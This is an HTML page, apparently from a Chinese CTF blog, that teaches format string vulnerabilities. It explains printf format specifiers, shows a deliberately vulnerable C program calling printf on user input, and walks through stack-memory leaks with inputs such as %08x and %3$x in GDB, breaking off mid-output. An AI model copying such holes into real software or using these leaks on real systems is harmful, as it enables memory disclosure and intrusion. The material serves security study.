@@ -1,0 +1,1034 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/cat.jpg">
+  <link rel="icon" href="/img/cat.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="briteny-pwn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="格式化字符串漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://example.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Briteny&#39;s Blog">
+<meta property="og:description" content="格式化字符串漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/00000000/image-20250428102310437.png">
+<meta property="article:published_time" content="2025-04-28T13:44:00.000Z">
+<meta property="article:modified_time" content="2025-04-28T03:26:44.920Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/00000000/image-20250428102310437.png">
+  
+  
+  
+  <title>格式化字符串漏洞 - Briteny&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":100,"cursorChar":".","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>briteny-pwn&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="格式化字符串漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-28 21:44" pubdate>
+          2025年4月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          68 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">格式化字符串漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="基础前备知识"><a href="#基础前备知识" class="headerlink" title="基础前备知识"></a>基础前备知识</h2><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C&#x2F;C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，<strong>可选</strong></li>
+</ul>
+<h4 id="格式化字符串函数-1"><a href="#格式化字符串函数-1" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h4><p>常见的有格式化字符串函数有</p>
+<ul>
+<li><p>输入</p>
+<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li><p>输出</p>
+<ul>
+<li><table>
+<thead>
+<tr>
+<th>printf</th>
+<th>输出到 stdout</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fprintf</td>
+<td>输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td>根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td>根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td>输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td>输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td>根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td>根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>setproctitle</td>
+<td>设置 argv</td>
+</tr>
+<tr>
+<td>syslog</td>
+<td>输出日志</td>
+</tr>
+<tr>
+<td>err, verr, warn, vwarn 等</td>
+<td>。。。</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>这里我们了解一下格式化字符串的格式，其基本格式如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%[parameter][flags][field width][.precision][length]type<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>parameter<ul>
+<li>n$，获取格式化字符串中的指定参数</li>
+</ul>
+</li>
+<li>flag</li>
+<li>field width<ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li>precision<ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li>length，输出的长度<ul>
+<li>hh，输出一个字节</li>
+<li>h，输出一个双字节</li>
+</ul>
+</li>
+<li>type<ul>
+<li>d&#x2F;i，有符号整数</li>
+<li>u，无符号整数</li>
+<li>x&#x2F;X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
+<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
+<li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
+<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
+<li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li>
+</ul>
+</li>
+</ul>
+<h5 id="参数-¶"><a href="#参数-¶" class="headerlink" title="参数 ¶"></a>参数 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_5">¶</a></h5><p>就是相应的要输出的变量。</p>
+<h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>在一开始，我们就给出格式化字符串的基本介绍，这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串来进行解析的 。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。比如说’%s’表明我们会输出一个字符串参数。</p>
+<p><img src="/./../00000000/image-20250428102310437.png" srcset="/img/loading.gif" lazyload alt="image-20250428102310437"></p>
+<p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">some value<br>3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %s...<br></code></pre></td></tr></table></figure>
+
+<p><strong>注：这里我们假设 3.14 上面的值为某个未知的值。</strong></p>
+<p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
+<ul>
+<li>当前字符不是 %，直接输出到相应标准输出。</li>
+<li>当前字符是 %， 继续读取下一个字符<ul>
+<li>如果没有字符，报错</li>
+<li>如果下一个字符是 %, 输出 %</li>
+<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
+</ul>
+</li>
+</ul>
+<p>那么假设，此时我们在编写程序时候，写成了下面的样子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
+<ol>
+<li>解析其地址对应的字符串</li>
+<li>解析其内容对应的整形值</li>
+<li>解析其内容对应的浮点值</li>
+</ol>
+<p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p>
+<p>这基本就是格式化字符串漏洞的基本原理了。</p>
+<h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><p>在CTF比赛中，通常利用格式化字符串漏洞来泄露内存和覆盖内存。</p>
+<h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
+<ul>
+<li>泄露栈内存<ul>
+<li>获取某个变量的值</li>
+<li>获取某个变量对应地址的内存</li>
+</ul>
+</li>
+<li>泄露任意地址内存<ul>
+<li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li>
+<li>盲打，dump 整个程序，获取有用信息。</li>
+</ul>
+</li>
+</ul>
+<h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>MakeFile:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<br></code></pre></td></tr></table></figure>
+
+<p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p>
+<h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">08x.%08x.%08x</span><br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffcfc400.000000c2.f765a6bb<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p>
+<p>首先，启动程序，将断点下在 printf 函数处</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br></code></pre></td></tr></table></figure>
+
+<p>之后，运行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">08x.%08x.%08x</span><br></code></pre></td></tr></table></figure>
+
+<p>此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28  printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20     ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br></code></pre></td></tr></table></figure>
+
+<p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为栈帧指针的返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br></code></pre></td></tr></table></figure>
+
+<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28<br>28  in printf.c<br>───────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;   ← $eax<br>0xffffcd14│+0x18: &quot;.%08x.%08x&quot;<br>0xffffcd18│+0x1c: &quot;x.%08x&quot;<br></code></pre></td></tr></table></figure>
+
+<p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]<br></code></pre></td></tr></table></figure>
+
+<p>当然，我们也可以使用 %p 来获取数据，如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">p.%p.%p</span><br>00000001.22222222.ffffffff.%p.%p.%p<br>0xfff328c0.0xc2.0xf75c46bb<br></code></pre></td></tr></table></figure>
+
+<p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
+<p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢</strong>？肯定是可以的啦。方法如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">n<span class="hljs-variable">$x</span></span><br></code></pre></td></tr></table></figure>
+
+<p>利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p>
+<p>这里我们再次以 gdb 调试一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>%3$x<br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28  printf.c: 没有那个文件或目录.<br><br>─────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20     ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%3$x<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%3$x&quot;) at printf.c:28<br>28  in printf.c<br>─────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 